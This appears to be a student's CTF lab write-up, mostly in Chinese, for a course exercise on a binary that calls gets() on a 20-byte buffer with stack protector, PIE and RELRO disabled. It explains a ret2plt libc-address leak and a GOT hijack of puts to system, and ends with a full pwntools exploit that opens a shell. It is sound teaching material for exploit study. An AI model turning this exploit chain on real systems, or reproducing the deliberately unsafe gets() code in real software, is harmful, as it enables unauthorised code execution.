---
title: Simple PWN 0x34 (2023 Lab - ret2plt)
tags: [eductf, CTF, PWN]

category: "Security/Course/NTU CS/PWN"
---

# Simple PWN 0x34 (2023 Lab - ret2plt)
<!-- more -->

## Background
Got Hijack / BoF

## Source code
```cpp
//gcc -no-pie -fno-stack-protector -z norelro ret2plt.c -o ret2plt
#include <stdio.h>
#include <stdlib.h>

int main(){
	char buf[20];
	setvbuf(stdout,0,2,0);
	printf("Try your best :");
	gets(buf);
	puts("boom !");	
}
```

## Recon
1. checksec + file
    ```bash
    $ checksec chal
    [*] '/mnt/d/NTU/Second Year/Computer Security/PWN/Lab2/lab_ret2plt/share/chal'
        Arch:     amd64-64-little
        RELRO:    No RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
    $ file chal
    chal: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f7ed984819a3908eff455bfcf87716d0fb298fac, for GNU/Linux 3.2.0, not stripped
    ```
    首先知道這隻binary是動態link library，所以可想而知，rop gadget一定少的可憐，所以我們不太能夠直接像上一題一樣暴力開一個shell出來，程式也沒有幫我們開，讓我們可以直接跳過去
2. 還是有很明顯的BOF的漏洞，此時就可以嘗試類似got hijack的方式打看看
流程:
1. 首先我們要知道libc base address才能夠利用扣掉offset的方式跳到system的地方，但是程式中並沒有能夠直接leak base address給我們的東西，因此我們可以自己想辦法leak: ==ret2plt==
    ```
    pop rdi ret
    puts got address
    puts plt
    ```
    這三行的意思是把puts的got address，透過puts印出來給我們 -> puts(put自己的got address)
2. 有了puts的got address之後，就可以扣掉puts在libc的offset，就可以知道base address，然後我們可以知道system的確切address
    ```python
    # leak puts got address to calculate libc base address
    puts_addr = u64(r.recv(6).ljust(8, b'\x00'))
    libc_base = puts_addr - libc.symbols['puts']
    libc.address = libc_base
    system_addr = libc.symbols['system']
    ```
3. 現在的問題有兩個，一個是我們要怎麼把==/bin/sh==送進去，因為如果直接看binary的gadget沒有`/bin/sh`或是`/sh`的string，不過我們可以直接用同樣的方法，把字串送進去
    ```python
    # fetch user input -> /bin/sh\x00
    pop_rdi_ret
    bss_addr
    gets_plt,
    ```
    此時他就會像使用者要輸入，並把我們的輸入丟到bss address
4. 另外一個問題就是我們要怎麼呼叫==system==，因為這個binary是動態的，代表一開始沒有link到system的話就不能直接呼叫，因此我們可以利用同樣的方法達到==got hijacking==
    ```python
    # fetch user input -> system address
    pop_rdi_ret
    puts_got
    gets_plt
    ```
    此時我們可以輸入system的address，經過這三行後我們就成功把puts got address換成system got address
5. 所有工具都準備好了，接下來只要呼叫puts就可以了，實際上就是呼叫system
    ```python
    # system('/bin/sh\x00')
    pop_rdi_ret
    bss_addr
    puts_plt
    ```

## Exploit - Ret2Plt(leak base address) + Got Hijack(call system)
```python
from pwn import *

r = process('./chal')
# r = remote('10.113.184.121', 10053)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
context.arch = 'amd64'

pop_rdi_ret = 0x0000000000401263
puts_got = 0x403368
puts_plt = 0x401070
gets_got = 0x403378
gets_plt = 0x401090
bss_addr = 0x403f00
payload = flat(
    # leak puts got address to calculate libc base address
    pop_rdi_ret,    puts_got,
    puts_plt,

    # fetch user input -> /bin/sh\x00
    pop_rdi_ret,    bss_addr,
    gets_plt,

    # fetch user input -> system address
    pop_rdi_ret,    puts_got,
    gets_plt,

    # system('/bin/sh\x00')
    pop_rdi_ret,    bss_addr,
    puts_plt
)
raw_input()
r.sendlineafter(b'Try your best :', b'a' * 0x28 + payload)
print(r.recvline())

puts_addr = u64(r.recv(6).ljust(8, b'\x00'))
log.info(f"puts address = {hex(puts_addr)}")

libc_base = puts_addr - libc.symbols['puts']
libc.address = libc_base
system_addr = libc.symbols['system']
log.info(f'system address = {hex(system_addr)}')
r.sendline(b'/bin/sh\x00')
raw_input()
r.sendline(p64(libc.symbols['system']))

r.interactive()
```